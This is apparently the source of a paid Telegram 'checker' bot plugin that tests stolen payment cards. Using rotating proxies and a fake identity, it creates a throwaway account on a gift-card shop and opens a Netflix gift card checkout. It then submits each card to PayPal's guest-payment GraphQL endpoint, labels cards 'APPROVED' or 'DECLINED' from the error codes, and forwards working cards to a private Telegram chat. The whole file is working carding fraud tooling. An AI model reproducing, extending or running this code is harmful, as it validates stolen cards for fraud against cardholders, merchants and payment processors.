import json
import base64
import requests
from parse import parseX
import check_template
import names
import re
import AdyenEncrypt
import uuid
from Plugins.SegundoPlano.antispam import *
import parser_kurama
import time
import random
from func_bin import get_bin_info
from Plugins.Func import connect_to_db
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from requests.exceptions import ProxyError, ConnectionError

max_retries = 3
retry_delay = 3

proxiess = "proxys.txt"

keyboard = InlineKeyboardMarkup(
    [
        [InlineKeyboardButton("Premium for only $3", url="https://t.me/RefeDarwinScrapper/9175")]
    ]
)

def generar_codigo_session():
    codigo_session = str(uuid.uuid4())
    return codigo_session

COMMAND_STATUS_FILE = "command_status.txt"

def is_command_enabled(command_name):
    with open(COMMAND_STATUS_FILE, "r") as f:
        command_status = f.read().splitlines()
    for line in command_status:
        name, status = line.split(":")
        if name == command_name:
            return status == "on"
    return False


name_gate = "PayPal"
subtype = "$15"
command = "pay"

@Client.on_message(filters.command([f"{command}"], prefixes=['.', '/', '!', '?'], case_sensitive=False) & filters.text)
def paypal2(client, message, command=command):
    if not is_command_enabled(f"{command}"):
            return message.reply(f""" <a href='https://imgur.com/ihpUqrG.jpg'>&#8203;</a> 
━━━━━✧𝑲𝒖𝒓𝒂𝒎𝒂𝑪𝒉𝒌✧━━━━━━
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] STATUS ↯ <code>MANTENIMIENTO | OFF ❌</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] GATEWAY ↯  <code>{name_gate}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] SUBTYPE ↯  <code>{subtype}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] USE ↯ <code>PREMIUM PLAN</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] VERSIÓN ↯ 6.0
━━━━━━━━━✧♛✧━━━━━━━━  </b> """, reply_markup=keyboard)
    username = message.from_user.username
    chat_id = message.chat.id
    user_id = message.from_user.id
    command = command
    ID = message.from_user.id
    FIRST = message.from_user.first_name
    spam_message = antispam(user_id, command, message)
    if spam_message is not None:
        message.reply(spam_message)
        return    
        
    #--------- VERIFICACION DE BIN BANEADOS ----------#
    
    ccs = message.text[len(f"/{command} "):]  
    reply = message.reply_to_message
    
    
    
    try:
        if not ccs:
            reply = message.reply_to_message
            texto = reply.text[:6]
        else:
            texto = ccs[:6]
    
        
    
        with open('binban.txt', 'r') as file:
            bins_baneados = file.readlines()
        
        for bin_baneado in bins_baneados:
            if texto.startswith(bin_baneado.strip()[:6]):
                message.reply('⚠️Error: Banned BIN. Please try another method.⚠️')
                return
            
    except:
        pass
        
    
    try:
    
        with open('binban.txt', 'r') as file:
            bins_baneados = file.readlines()
        
        for bin_baneado in bins_baneados:
            if texto.startswith(bin_baneado.strip()[:6]):
                message.reply('⚠️Error: Banned BIN. Please try another method.⚠️')
                return
        
    except:
        pass
        
    conn = connect_to_db()
    cursor = conn.cursor()
    user_id = message.from_user.id
    username = message.from_user.username  
    
    cursor.execute('SELECT rango, creditos, antispam, dias FROM users WHERE user_id = ?', (user_id,))
    user_data = cursor.fetchone()
    if not user_data:
                return message.reply(f"<b>First, you must register. /register .</b> ")
            
    if user_data[0] in ["Baneado", "baneado"]:
        return message.reply(f"<b>You are not allowed to use the \nReason: Banned bot❌. </b> ")
           
    chat_id2 = message.chat.id
    chat_data = cursor.execute('SELECT rango FROM users WHERE user_id = ?', (chat_id2,))
    chat_data = cursor.fetchone()
    
    if chat_data is None:
        chat_data = "Free"
        
        
           
    if all(role not in user_data[0] for role in ["Premium", "Seller", "Owner"]) and all(role not in chat_data[0] for role in ["Staff", "Staff"]):
            return message.reply(f"<b>The chat is not authorized to use this command. Contact admin @Crypto_locker5 ❌</b> <a href='https://imgur.com/ihpUqrG.jpg'>&#8203;</a>", reply_markup=keyboard)
        
    


    ccs = message.text[len(f"/{command} "):]  
                  
      
    reply = message.reply_to_message
            
    if not ccs:
        if not reply or not reply.text:
            return message.reply(f"""<b>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] 𝑲𝒖𝒓𝒂𝒎𝒂 𝑪𝒉𝒌
━━━━━━━━━━━━━━━━
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Gateway ↯ <code>{name_gate}</code>   
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Subtype ↯ <code>{subtype}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Use ↯ <code>${command} cc|month|year|cvv</code>
━━━━━━━━━━━━━━━━
</b>""", reply_markup=keyboard, disable_web_page_preview=True)
     

        ccs = reply.text
        

    result = parser_kurama.parseData(ccs)
    x = get_bin_info(ccs[:6])

    if 'error' in result:
        return message.reply(f"""<b> 
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] 𝑲𝒖𝒓𝒂𝒎𝒂 𝑪𝒉𝒌
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Gateway ↯ <code>{name_gate} {subtype}</code>   
━━━━━━━━━━━━━━━━
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] CC ↯ <code>{ccs}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Status ↯ <b>DECLINED ❌</b>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Result ↯ Card Invalid!
━━━━━━━━━━━━━━━━
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Bin ↯ <code>{x.get("type")}</code> | <code>{x.get("level")}</code> | <code>{x.get("vendor")}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Country ↯ <code>{x.get("country")} {x.get("flag")}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Bank ↯ <code>{x.get("bank_name")}</code>
━━━━━━━━━━━━━━━━
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Checked by ↯ @{username} [{user_data[0]}]
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Bot by ↯ @Crypto_locker5

</b>""", reply_markup=keyboard, disable_web_page_preview=True)
            
        
    ccnum = result['ccnum']
    mes = result['month']
    ano = result['year']
    if len(ano) == 2:
        ano = '20'+result['year']
    cvv = result['cvv']
    ccs = f"{ccnum}|{mes}|{ano}|{cvv}"
    
    AdyenECC = AdyenEncrypt.encrypter(f"{ccnum}|{mes}|{ano}|{cvv}", "99D7FDADA8B782E83139599FAD2C0627B5EA21DBED947251B1C6FD6D0380076777EBC7F91DF7D0CD6DD86896B7B60B22A82E26B92C88ABC07A4D775C2F0A1B9713E247F7093678E2F06B0A80530DF6D2B7278C2D7A2433B2D917BCC9EB1B0EE871A35AB3D8BB45D33D9AC3B3A7FC4805AFC3C28104705555123C80F0565BF8A5F8F81A7A393E31809223F9C6003A7FC31B59049BDFA8ED0FCBF86BFE562B352D1E2225CC9BD803067C6735FF5767BD683648F6B18AAD95EDD23748C0B23760BC3B01EAFC21266F799C300A8A339CBAF3EA900001C9CAF9FD404F2C493BC58AB8005E19A8EF4BD87E6B18DEFE61D0AA5568C611743C34A2EC55A97ADD216F2EA9")
    AdyenCCnum = AdyenECC[0]
    Adyenmes = AdyenECC[1]
    Adyenano = AdyenECC[2]
    Adyencvv = AdyenECC[3]
        
    
    req = requests.get(f"https://bins.antipublic.cc/bins/{ccnum[:6]}").json()      
    brand = req['brand']
    CorreoRand = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}@gmail.com"
    x = get_bin_info(ccnum[:6])
        
    #---------- PLANTILLA DE CARGA #1 ------------#
    loading_message = message.reply(f"""<b>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] 𝑲𝒖𝒓𝒂𝒎𝒂 𝑪𝒉𝒌
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Gateway ↯ <code>{name_gate} {subtype}</code>   
━━━━━━━━━━━━━━━━
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] CC ↯ <code>{ccs}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Status ↯ <b>Loading...</b> 
━━━━━━━━━━━━━━━━
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Bin ↯ <code>{x.get("type")}</code> | <code>{x.get("level")}</code> | <code>{x.get("vendor")}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Country ↯ <code>{x.get("country")} {x.get("flag")}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Bank ↯ <code>{x.get("bank_name")}</code>
━━━━━━━━━━━━━━━━  </b>""", reply_markup=keyboard, disable_web_page_preview=True)
    
    SessionId = generar_codigo_session()
    session = requests.Session()
    
    with open(proxiess, 'r') as file:
        proxies_1 = file.read().splitlines()
            
        session = requests.Session()
        proxie = random.choice(proxies_1)

        session.proxies = {
        'https': f'{proxie}'}
    
    inicio = time.time()

    #------------------- #1 Requests -------------------#
    headers = {
            'authority': 'www.thecardcloset.com',
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/json',
            # 'cookie': '_gcl_au=1.1.1786633352.1707176959; _uetsid=2de36650c48111ee90dee17a3debba1f; _uetvid=2de39db0c48111ee8fb1ab4a2dbce1c8; _ga=GA1.1.1373741209.1707176960; _fbp=fb.1.1707176961638.638701864; wheelStatus={"hasRendered":true,"closed":false}; in-gol=7dadfc8226f061c97b33ca5990d41eb1498417d79cd54f17d5305118186ee7ac; _ga_Z4V4ZMVG99=GS1.1.1707176959.1.1.1707177036.59.0.0',
            'origin': 'https://www.thecardcloset.com',
            'referer': 'https://www.thecardcloset.com/checkout?step=2',
            'sec-ch-ua': '"Not A(Brand";v="99", "Microsoft Edge";v="121", "Chromium";v="121"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
        }

    json_data = {
            'username': CorreoRand,
            'phone': '2486354657',
            'name': 'Andres Bermudez',
            'password': 'Kurama#1212',
        }

        
    for retry in range(max_retries):
        try:

            response = session.post('https://www.thecardcloset.com/auth/signup/', headers=headers, json=json_data).text
            jwt = parseX(response, '"jwt":"', '"')
            break  
        
        except (ProxyError, ConnectionError) as e:
            print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
            if retry < max_retries-1:
                print(f"Reintentando en {retry_delay} segundo...")
                time.sleep(retry_delay)
            else:
                msg = "DECLINED ❌"
                respuesta = "Maximum number of retries reached: 3 | Requests #1"

                proxyy = "DEAD 🟥"
                gateway = f'<code>{name_gate} {subtype}</code>'
                end = time.time()
                tiempo = str(inicio - end)[1:5]
                session.close()  
                return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

        except requests.exceptions.RequestException as e:
            print(f"Error de solicitud: {e} Requests #1")
            msg = "DECLINED ❌"
            respuesta = "Error de solicitud | Requests #1"

            proxyy = "LIVE 🟩"
            gateway = f'<code>{name_gate} {subtype}</code>'
            end = time.time()
            tiempo = str(inicio - end)[1:5]
            session.close()
            return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

        except Exception as e:
            print(f"Error de solicitud: {e} Requests #1")
            msg = "DECLINED ❌"
            respuesta = "An unexpected error has occurred. | Requests #1"
            proxyy = "LIVE 🟩"
            gateway = f'<code>{name_gate} {subtype}</code>'
            end = time.time()
            tiempo = str(inicio - end)[1:5]
            session.close()
            return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

    #------------------- #2 Requests -------------------#
    
    headers = {
            'authority': 'www.thecardcloset.com',
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-US,en;q=0.9',
            'authorization': f'Bearer {jwt}',
            'content-type': 'application/json',
            # 'cookie': '_gcl_au=1.1.1786633352.1707176959; _uetsid=2de36650c48111ee90dee17a3debba1f; _uetvid=2de39db0c48111ee8fb1ab4a2dbce1c8; _ga=GA1.1.1373741209.1707176960; _fbp=fb.1.1707176961638.638701864; wheelStatus={"hasRendered":true,"closed":false}; cd_jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2NWMxNzQ2NGE5ODEwZTgyYzg3ZTIyZDUiLCJ1c2VybmFtZSI6Im5hbmV0ZWhhcmxlcXVpbkBqY25vcnJpcy5jb20iLCJlbWFpbCI6Im5hbmV0ZWhhcmxlcXVpbkBqY25vcnJpcy5jb20iLCJmaXJzdE5hbWUiOiJBbmRyZXMiLCJsYXN0TmFtZSI6IkJlcm11ZGV6IiwiZnVsbE5hbWUiOiJBbmRyZXMgQmVybXVkZXoiLCJ0aXRsZSI6IkFuZHJlcyIsImFuYWx5dGljcyI6eyJmaXJzdFB1cmNoYXNlQ29tcGxldGUiOmZhbHNlfSwicGhvbmVzIjpbXSwiZW1haWxTdWJzY3JpcHRpb25zIjp7Im1hcmtldGluZyI6dHJ1ZX0sInJvbGUiOiJjdXN0b21lciIsImlhdCI6MTcwNzE3NzA2MSwiZXhwIjoxNzE0OTUzMDYxLCJhdWQiOiJjdXN0b21lciJ9.aX2ejPXPBTseGV0u5k0KiYz1oc5yj5s8cB6J8-hxHqc; in-gol=d360934294c1424cfe2ec930789feda31c4b4a0c177003e27d0c7e46d4cc4271; _ga_Z4V4ZMVG99=GS1.1.1707176959.1.1.1707177063.32.0.0',
            'origin': 'https://www.thecardcloset.com',
            'referer': 'https://www.thecardcloset.com/checkout?step=3',
            'sec-ch-ua': '"Not A(Brand";v="99", "Microsoft Edge";v="121", "Chromium";v="121"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
        }

    json_data = {
            'useStoreCredit': False,
            'paymentMethod': 'PayPal',
            'currency': 'USD',
            'cartItems': [
                {
                    'id': 'bfa0c2ce-ec89-467a-a2b0-107a96785fe8',
                    'productId': '5b80285a4698b87457a34d0e',
                    'valueId': '5b80293f4698b87457a34d1f',
                    'isGift': False,
                    'qty': 1,
                    'value': {
                        'isNewProduct': False,
                        'name': '$30',
                        'displayName': '$30',
                        'imageURL': '30-netflix-digital-gift-card-email-delivery-2x.png',
                        'imageAlt': '$30 Netflix Gift Card',
                        'price': 3799,
                        'originalPrice': 3899,
                        'faceValue': 3000,
                        'denominationUrl': '30-usa-netflix-gift-card-email-delivery',
                        'merchantCenterInfo': {
                            'gtin': '799366349402',
                        },
                        'inStock': True,
                        'bulkPricing': [
                            {
                                'minimum': 4,
                                'priceDiscount': 99,
                                '_id': '5e5ea90e8ede4600135f1016',
                            },
                        ],
                        'tabs': [],
                        'pageTitle': 'Buy $30 Netflix Card Code Online | Netflix Gift Card Email Delivery',
                        'metaDescription': 'Buy $30 Netflix card codes from The Card Closet & get access to popular tv shows and movies. Fast Email Delivery. Pay with PayPal.',
                        'metaKeywords': '$30 Netflix Gift Card',
                        'wholesale': {
                            'price': 3150,
                        },
                        'deleted': False,
                        'visible': True,
                        '_id': '5b80293f4698b87457a34d1f',
                    },
                    'multiBuy': False,
                    'product': {
                        '_id': '5b80285a4698b87457a34d0e',
                        'displayName': 'USA Netflix Gift Card',
                        'values': [
                            {
                                'isNewProduct': False,
                                'name': '$30',
                                'displayName': '$30',
                                'imageURL': '30-netflix-digital-gift-card-email-delivery-2x.png',
                                'imageAlt': '$30 Netflix Gift Card',
                                'price': 3799,
                                'originalPrice': 3899,
                                'faceValue': 3000,
                                'denominationUrl': '30-usa-netflix-gift-card-email-delivery',
                                'merchantCenterInfo': {
                                    'gtin': '799366349402',
                                },
                                'inStock': True,
                                'bulkPricing': [
                                    {
                                        'minimum': 4,
                                        'priceDiscount': 99,
                                        '_id': '5e5ea90e8ede4600135f1016',
                                    },
                                ],
                                'tabs': [],
                                'pageTitle': 'Buy $30 Netflix Card Code Online | Netflix Gift Card Email Delivery',
                                'metaDescription': 'Buy $30 Netflix card codes from The Card Closet & get access to popular tv shows and movies. Fast Email Delivery. Pay with PayPal.',
                                'metaKeywords': '$30 Netflix Gift Card',
                                'wholesale': {
                                    'price': 3150,
                                },
                                'deleted': False,
                                'visible': True,
                                '_id': '5b80293f4698b87457a34d1f',
                            },
                            {
                                'isNewProduct': False,
                                'name': '$60',
                                'displayName': '$60',
                                'imageURL': '60-netflix-digital-gift-card-email-delivery-2x.png',
                                'imageAlt': '$60 Netflix Gift Card',
                                'price': 7399,
                                'originalPrice': 7499,
                                'faceValue': 6000,
                                'denominationUrl': '60-usa-netflix-gift-card-email-delivery',
                                'merchantCenterInfo': {
                                    'gtin': '799366349419',
                                },
                                'inStock': True,
                                'bulkPricing': [
                                    {
                                        'minimum': 2,
                                        'priceDiscount': 49,
                                        '_id': '5e5ea90e8ede4600135f1018',
                                    },
                                ],
                                'tabs': [],
                                'pageTitle': 'Buy $60 Netflix Card Code Online | Netflix Gift Card Email Delivery',
                                'metaDescription': 'Buy $60 Netflix card codes from The Card Closet & get access to popular tv shows and movies. Fast Email Delivery. Pay with PayPal.',
                                'metaKeywords': '$60 Netflix Gift Card',
                                'wholesale': {
                                    'price': 6360,
                                },
                                'deleted': False,
                                'visible': True,
                                '_id': '5b80293f4698b87457a34d1e',
                            },
                        ],
                        'name': 'Netflix',
                        'url': 'netflix-gift-cards',
                        'visible': True,
                        'imageURL': 'netflix-digital-gift-card-email-delivery-2x.png',
                    },
                    'recipient': {
                        'name': '',
                        'deliveryType': 'email',
                        'email': '',
                        'text': '',
                        'instantDelivery': True,
                        'deliveryDate': 1707176986636,
                        'isMessage': True,
                        'message': '',
                    },
                    'bulkPricing': [
                        {
                            'minimum': 4,
                            'priceDiscount': 99,
                            '_id': '5e5ea90e8ede4600135f1016',
                        },
                    ],
                    'price': 3799,
                    'currentBulkStatus': None,
                },
            ],
            'deviceData': {
                'appCodeName': 'Mozilla',
                'appName': 'Netscape',
                'appVersion': '5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
                'product': 'Gecko',
                'cookieEnabled': True,
                'language': 'en-US',
                'languages': [
                    'en-US',
                ],
                'online': True,
                'platform': 'Win32',
                'userAgent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
                'javaEnabled': False,
                'plugins': [
                    {
                        'description': 'Portable Document Format',
                        'filename': 'internal-pdf-viewer',
                        'length': 2,
                        'name': 'PDF Viewer',
                    },
                    {
                        'description': 'Portable Document Format',
                        'filename': 'internal-pdf-viewer',
                        'length': 2,
                        'name': 'Chrome PDF Viewer',
                    },
                    {
                        'description': 'Portable Document Format',
                        'filename': 'internal-pdf-viewer',
                        'length': 2,
                        'name': 'Chromium PDF Viewer',
                    },
                    {
                        'description': 'Portable Document Format',
                        'filename': 'internal-pdf-viewer',
                        'length': 2,
                        'name': 'Microsoft Edge PDF Viewer',
                    },
                    {
                        'description': 'Portable Document Format',
                        'filename': 'internal-pdf-viewer',
                        'length': 2,
                        'name': 'WebKit built-in PDF',
                    },
                ],
            },
            'braintreeVZero': False,
        }

            
    for retry in range(max_retries):
        try:
            
            response = session.post('https://www.thecardcloset.com/checkout', headers=headers, json=json_data).text
        
            ec_tok = parseX(response, 'express-checkout&token=', '"')
        
            break  
        
        except (ProxyError, ConnectionError) as e:
            print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
            if retry < max_retries-1:
                print(f"Reintentando en {retry_delay} segundo...")
                time.sleep(retry_delay)
            else:
                msg = "DECLINED ❌"
                respuesta = "Maximum number of retries reached: 3 | Requests #2"

                proxyy = "DEAD 🟥"
                gateway = f'<code>{name_gate} {subtype}</code>'
                end = time.time()
                tiempo = str(inicio - end)[1:5]
                session.close()
                return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

        except requests.exceptions.RequestException as e:
            print(f"Error de solicitud: {e} Requests #2")
            msg = "DECLINED ❌"
            respuesta = "Error de solicitud | Requests #2"

            proxyy = "LIVE 🟩"
            gateway = f'<code>{name_gate} {subtype}</code>'
            end = time.time()
            tiempo = str(inicio - end)[1:5]
            session.close()
            return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

        except Exception as e:
            print(f"Error de solicitud: {e} Requests #2")
            msg = "DECLINED ❌"
            respuesta = "An unexpected error has occurred. | Requests #2"
            proxyy = "LIVE 🟩"
            gateway = f'<code>{name_gate} {subtype}</code>'
            end = time.time()
            tiempo = str(inicio - end)[1:5]
            session.close()
            return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

        
    #------------------- #3 Requests -------------------#   
    
    headers = {
            'authority': 'www.paypal.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/json',
            # 'cookie': 'l7_az=dcg14.slc; ts_c=vr%3D7a7d2ac418d0a7983025c73afad54eed%26vt%3D7baebc7f18d0ad11c44d4954fac8633f; enforce_policy=ccpa; LANG=en_US%3BUS; nsid=s%3AR2O1_b8uRM3ETs3FbbXm-SdcfOAsgvcA.pQgwWQtaCSSuyeZBmAxWNV0YYd0yKTaVsDkOlYQwons; KHcl0EuY7AKSMgfvHl7J5E7hPtK=d_3RJoLAkhU-1ZPQoIVcbCRjSl6PYeoWRKUyPs-kmK81SUjJrhGQ11PHnpPmjt_AF0gGFGKc6gkNzzyn; ddi=JpKe1fAtYb3ylQrhgAH_UlZHVBnrfO4zphcnEmQa-psed9hpTwDqQ8Vgbm1NBDqpQMLuUgm2MFEcHW3Wm_SsiwJRe9FnWg-Rn7vzwOeTGDWl7oLj; sc_f=bGigYy3NnDSrjU0wIjvfvOJslyL894ieESU-3na5dsIPVMSmGSOa8nF7ce2Nw5XRFUb-0N9MTEufYQSre1ecj5LDy7Ntmwm3TeNEzW; ts=vreXpYrS%3D1801871484%26vteXpYrS%3D1707178884%26vr%3D7a7d2ac418d0a7983025c73afad54eed%26vt%3D7baebc7f18d0ad11c44d4954fac8633f%26vtyp%3Dreturn; tsrce=checkoutjs; x-pp-s=eyJ0IjoiMTcwNzE3NzA4NDg5NSIsImwiOiIwIiwibSI6IjAifQ',
            'origin': 'https://www.paypal.com',
            'paypal-client-context': ec_tok,
            'paypal-client-metadata-id': ec_tok,
            'referer': 'https://www.paypal.com/smart/card-fields?sessionID=uid_8e27fdfd28_mjm6nte6mdq&buttonSessionID=uid_6c2b40c9f0_mjm6nte6mdq&locale.x=en_US&commit=true&env=production&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QWRuZDRIV3BZOTZ1bVktYWNuYlBMaU1KQmtvbWFZQmZDYUsyeU9UbV9lZTB2bERaOW9aUXUteXZMY3JfeEVRVkw1YXppQmMxeXBPZ1l5SU4maW50ZW50PWF1dGhvcml6ZSZkaXNhYmxlLWZ1bmRpbmc9Y3JlZGl0JmVuYWJsZS1mdW5kaW5nPWNhcmQiLCJhdHRycyI6eyJkYXRhLXNkay1pbnRlZ3JhdGlvbi1zb3VyY2UiOiJyZWFjdC1wYXlwYWwtanMiLCJkYXRhLXVpZCI6InVpZF9waGZ4ZmpuZGt3aWt6enpmbnBmenNpcXllY2NhZGgifX0&disable-card=&token=EC-2JH81149J8500293P',
            'sec-ch-ua': '"Not A(Brand";v="99", "Microsoft Edge";v="121", "Chromium";v="121"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
            'x-app-name': 'standardcardfields',
            'x-country': 'US',
        }

    json_data = {
            'query': '\n        mutation payWithCard(\n            $token: String!\n            $card: CardInput!\n            $phoneNumber: String\n            $firstName: String\n            $lastName: String\n            $shippingAddress: AddressInput\n            $billingAddress: AddressInput\n            $email: String\n            $currencyConversionType: CheckoutCurrencyConversionType\n            $installmentTerm: Int\n        ) {\n            approveGuestPaymentWithCreditCard(\n                token: $token\n                card: $card\n                phoneNumber: $phoneNumber\n                firstName: $firstName\n                lastName: $lastName\n                email: $email\n                shippingAddress: $shippingAddress\n                billingAddress: $billingAddress\n                currencyConversionType: $currencyConversionType\n                installmentTerm: $installmentTerm\n            ) {\n                flags {\n                    is3DSecureRequired\n                }\n                cart {\n                    intent\n                    cartId\n                    buyer {\n                        userId\n                        auth {\n                            accessToken\n                        }\n                    }\n                    returnUrl {\n                        href\n                    }\n                }\n                paymentContingencies {\n                    threeDomainSecure {\n                        status\n                        method\n                        redirectUrl {\n                            href\n                        }\n                        parameter\n                    }\n                }\n            }\n        }\n        ',
            'variables': {
                'token': ec_tok,
                'card': {
                    'cardNumber': ccnum,
                    'expirationDate': f'{mes}/{ano}',
                    'postalCode': '10080',
                    'securityCode': cvv,
                },
                'phoneNumber': '2486354657',
                'firstName': 'Andres',
                'lastName': 'Bermudez',
                'billingAddress': {
                    'givenName': 'Andres',
                    'familyName': 'Bermudez',
                    'line1': None,
                    'line2': None,
                    'city': None,
                    'state': None,
                    'postalCode': '10080',
                    'country': 'US',
                },
                'email': CorreoRand,
                'currencyConversionType': 'VENDOR',
            },
            'operationName': None,
        }

        
    
    for retry in range(max_retries):
        try:
            response = session.post(
                'https://www.paypal.com/graphql?fetch_credit_form_submit',
                headers=headers,
                json=json_data,
            ).text
            
            code = parseX(response, '"code":"', '"')
            
    
            break
           
        except (ProxyError, ConnectionError) as e:
            print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
            if retry < max_retries-1:
                print(f"Reintentando en {retry_delay} segundo...")
                time.sleep(retry_delay)
            else:
                msg = "DECLINED ❌"
                respuesta = "Maximum number of retries reached: 3 | Requests #3"

                proxyy = "DEAD 🟥"
                gateway = f'<code>{name_gate} {subtype}</code>'
                end = time.time()
                tiempo = str(inicio - end)[1:5]
                session.close()
                return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)


    
        except requests.exceptions.RequestException as e:
            print(f"Error de solicitud: {e} Requests #3")
            msg = "DECLINED ❌"
            respuesta = "Error de solicitud | Requests #3"

            proxyy = "LIVE 🟩"
            gateway = f'<code>{name_gate} {subtype}</code>'
            end = time.time()
            tiempo = str(inicio - end)[1:5]
            session.close()
            return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

        
        except KeyError as e:
            print(f"Error de clave: {e}")
            msg = "DECLINED ❌"
            respuesta = f"Error al obtener {e} del response | Requests #3"

            proxyy = "LIVE 🟩" 
            gateway = f'<code>{name_gate} {subtype}</code>'
            end = time.time()
            tiempo = str(inicio - end)[1:5]
            session.close()
            return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

        except Exception as e:
            print(f"Error de solicitud: {e} Requests #3")
            msg = "DECLINED ❌"
            respuesta = "An unexpected error has occurred. | Requests #3"
            proxyy = "LIVE 🟩"
            gateway = f'<code>{name_gate} {subtype}</code>'
            end = time.time()
            tiempo = str(inicio - end)[1:5]
            session.close()
            return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

     
    #------------------- RESPONSE CODE ------------------------#
    
    if "INVALID_SECURITY_CODE" in code:
            msg = "APPROVED CCN ✅"
            respuesta = code
                                
    elif "INVALID_BILLING_ADDRESS" in code:
            msg = "APPROVED AVS✅"
            respuesta = code
                                
    elif "OAS_VALIDATION_ERROR" in code:
                                
            msg = "APPROVED ✅"
            respuesta = code
                                
    elif "EXISTING_ACCOUNT_RESTRICTED" in code:
            msg = "APPROVED ✅"
            respuesta = code
                                
    elif "VALIDATION_ERROR" in code:
            msg = "APPROVED ✅"
            respuesta = code
        
    elif int(response.find('is3DSecureRequired')) > 0 :
            print("CHARGE $15")
                    
            msg = "APPROVED ✅"
            respuesta = "Charge $15"
                                              
    else:
            msg = "DECLINED ❌"
            respuesta = code
            
    
    proxyy = "LIVE 🟩"
    gateway = f'<code>{name_gate} {subtype}</code>'
    end = time.time()
    tiempo = str(inicio - end)[1:5]
    session.close()  
    if "APPROVED" in msg:
        
        chat_id = -1002000802973
    
        client.send_message(chat_id, check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy))
        
    return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)
    